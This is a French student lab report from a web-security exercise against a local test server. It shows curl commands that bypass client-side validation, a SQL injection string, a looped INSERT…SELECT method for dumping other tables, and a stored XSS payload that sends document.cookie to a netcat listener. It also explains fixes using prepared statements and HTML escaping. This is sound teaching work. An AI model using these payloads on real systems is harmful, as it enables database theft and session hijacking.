# Rendu "Injection"

## Binome

Nom, Prénom, email: KROL Mikolaï mikolai.krol.etu@univ-lille.fr  
Nom, Prénom, email: HOLVOET Adrien adrien.holvoet.etu@univ-lile.fr


## Question 1

* Quel est ce mécanisme?   

La mise en place d'une vérification de l'input par une function javascript avec un regex. Donc une vérification côté client.

* Est-il efficace? Pourquoi?   
Non car c'est très simple de contourner une vérification côté client, il est préférable de faire cela côté serveur. En effet cette vérification peut-être contourner par une simple requête curl ou encore en désactivant le javascript dans la navigateur.

## Question 2

* Votre commande curl   
```
curl -d "chaine=f(-(é_à" http://localhost:8080;
```

## Question 3

* Votre commande curl pour mettre le contenu que je souhaite dans le champ who autre que l'adresse ip 127.0.0.1
```
curl -d 'chaine=mon text%27%,%27ce que je veux%27) -- '  http://localhost:8080;
```


* Expliquez comment obtenir des informations sur une autre table

Pour obtenir les infos d'une autre table, il faudrait connaitre le nom de celle-ci et également les colonnes que l'on souhaite regarder. Et on pourrait alors combiner la commande INSERT INTO avec la commande SELECT pour selectionner les valeurs comprises dans une autres tables, les insérer dans les colonnes txt et who de notre table chaines qui s'affichera sur notre page web.
La commande SQL ressemblerais à ça `INSERT INTO chaines (txt,who) VALUES ((SELECT col1 FROM otherTable), (SELECT col2 FROM otherTable))`, il suffirait de limiter chaque select pour n'avoir qu'un seul resultat et ne pas provoquer une erreur SQL : 'Subquery returns more than 1 row'. Ca peut se faire par exemple en rajoutant une clause where id=1 et incrémenter cette id dans une boucle while où on exécutera notre commande curl en boucle afin de récuperer tous les enregistrements. Commande SQL final : `INSERT INTO chaines (txt,who) VALUES ((SELECT col1 FROM otherTable where id=i), (SELECT col2 FROM otherTable where id=i))` i s'incrémente à chaque boucle.

## Question 4

Rendre un fichier server_correct.py avec la correction de la faille de
sécurité. Expliquez comment vous avez corrigé la faille.   

Nous utilons donc un Parameterized query et prepared statement afin d'évitez les injections SQL.  Pour cela nous devons premièrement mettre en place un prepared statement sur notre cursor comme ceci : `cursor = self.conn.cursor(prepared=True)`. Ensuite, nous avons créer la parameterized SQL query qui utilisent deux placeholders comme ceci : `requete = "INSERT INTO chaines (txt,who) VALUES(%s, %s)"` Les inputs rentrés par l'utilisateur vont se retrouver dans un tuple  `values = (post["chaine"], cherrypy.request.remote.ip)` qui va prendre  la place de ces placeholders(%s, %s). Il ne suffit plus maintenant que d'utiliser la méthode `execute` du `cursor` afin d'exécutur notre requête SQL, celui-ci prend donc notre parameterized SQL query et notre tuple, comme ceci : `cursor.execute(requete, values)`.   
Ce mécanisme permet d'empêcher donc l'injection SQL de la Question 3

## Question 5

* Commande curl pour afficher une fenetre de dialog. 
```
curl -d 'chaine=<script>alert("hello")</script>'  http://localhost:8080;
```

* Commande curl pour lire les cookies . 

D'abord il faut lancer la commande netcat : `nc -l -p 8081` et on pourra voir le contenu du cookie dans le terminal où cette commande a été lancé

```
curl -d 'chaine=<script>window.location.replace("http://localhost:8081/search?cookie=" %2B document.cookie)</script>'  http://localhost:8080;

```

## Question 6

* Rendre un fichier server_xss.py avec la correction de la faille. Expliquez la demarche que vous avez suivi.

   - On escape la chaine passée en paramètre avant l'insertion en base de donnée, la chaine inserée ne contiendra donc aucun caractère qui pourrait être interprété comme du html quand on l'insèrera dans la page html. Comme ceci : `values = (html.escape(post["chaine"]), cherrypy.request.remote.ip)`

   - On peut également escape la chaine dans l'html au cas où des scripts se trouve déja dans la base de donnée comme ceci :  `'''+"\n".join(["<li>" + html.escape(s) + "</li>" for s in chaines])+'''`.  Cette démarche est inutile dans le cas où toutes les requêtes passe par ce serveur qui utilise l'html espace juste avant l'insertion en base de donnée.



